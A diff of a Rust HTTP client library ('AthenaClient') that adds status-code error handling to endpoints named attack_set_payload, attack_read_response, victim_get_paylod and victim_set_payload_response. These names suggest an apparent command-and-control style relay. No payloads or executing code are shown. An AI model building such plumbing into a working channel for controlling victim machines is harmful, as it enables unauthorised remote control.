@@ -16,7 +16,10 @@
  */
 use std::error::Error;
 
-use reqwest::{Client, ClientBuilder};
+use derive_more::{Display, Error};
+use reqwest::StatusCode;
+pub use reqwest::{Client, ClientBuilder};
+use serde::{Deserialize, Serialize};
 use url::Url;
 
 pub mod payload;
@@ -44,7 +47,7 @@ impl AthenaClientBuilder {
         self.client = Some(client);
         Ok(self)
     }
-    pub fn host(&mut self, host: &str) -> &mut Self {
+    pub fn host(&mut self, host: String) -> &mut Self {
         if host.ends_with('/') {
             self.host = Some(host[0..host.len() - 1].to_owned())
         } else {
@@ -85,17 +88,15 @@ impl AthenaClient {
     pub async fn attack_set_payload(
         &self,
         payload: &attack::Payload,
-    ) -> AthenaResult<Vec<attack::PayloadID>> {
+    ) -> AthenaResult<attack::PayloadID> {
         let url = self.host.clone().join(V1_ROUTES.attack.set_payload)?;
-
-        Ok(self
-            .client
-            .post(url)
-            .json(&payload)
-            .send()
-            .await?
-            .json()
-            .await?)
+        let resp = self.client.post(url).json(&payload).send().await?;
+        if resp.status() == StatusCode::OK {
+            Ok(resp.json().await?)
+        } else {
+            let err: ErrorToResponse = resp.json().await.unwrap();
+            Err(Box::new(err))
+        }
     }
 
     pub async fn attack_read_response(
@@ -107,15 +108,13 @@ impl AthenaClient {
             password: self.get_password().to_owned(),
         };
         let url = self.host.clone().join(V1_ROUTES.attack.read_response)?;
-
-        Ok(self
-            .client
-            .post(url)
-            .json(&payload)
-            .send()
-            .await?
-            .json()
-            .await?)
+        let resp = self.client.post(url).json(&payload).send().await?;
+        if resp.status() == StatusCode::OK {
+            Ok(resp.json().await?)
+        } else {
+            let err: ErrorToResponse = resp.json().await.unwrap();
+            Err(Box::new(err))
+        }
     }
 
     pub fn get_password(&self) -> &str {
@@ -128,9 +127,18 @@ impl AthenaClient {
         Ok(())
     }
 
-    pub async fn victim_get_paylod(&self) -> AthenaResult<Vec<victim::Payload>> {
+    pub async fn victim_get_paylod(&self) -> AthenaResult<victim::PayloadCollection> {
         let url = self.host.clone().join(V1_ROUTES.victim.get_payload)?;
-        Ok(self.client.post(url).send().await?.json().await?)
+        //        Ok(self.client.post(url).send().await?.json().await?)
+        let resp = self.client.post(url).send().await?;
+        if resp.status() == StatusCode::OK {
+            //println!("{:?}", resp.json::<serde_json::Value>().await.unwrap());
+            //unimplemented!();
+            Ok(resp.json().await.unwrap())
+        } else {
+            let err: ErrorToResponse = resp.json().await.unwrap();
+            Err(Box::new(err))
+        }
     }
 
     pub async fn victim_set_payload_response(
@@ -141,6 +149,12 @@ impl AthenaClient {
         self.client.post(url).json(payload).send().await?;
         Ok(())
     }
+}
+
+#[derive(Serialize, Error, Display, Debug, Deserialize)]
+#[cfg(not(tarpaulin_include))]
+pub struct ErrorToResponse {
+    pub error: String,
 }
 
 pub type AthenaResult<T> = Result<T, Box<dyn Error>>;
